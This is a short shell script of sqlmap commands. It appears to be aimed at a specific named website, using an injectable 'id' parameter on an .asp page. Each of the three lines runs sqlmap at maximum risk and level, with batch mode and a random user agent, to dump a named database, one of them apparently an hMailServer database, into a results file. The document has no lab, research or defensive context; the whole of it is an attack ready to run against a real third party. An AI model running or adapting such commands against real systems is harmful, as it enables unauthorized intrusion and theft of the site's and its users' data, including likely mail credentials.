python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D cariat_dcb --dump >> result.txt ;
python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D cariat_rob --dump >> result.txt ; 
python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D hmailserver --dump >> result.txt ;
echo "ok"

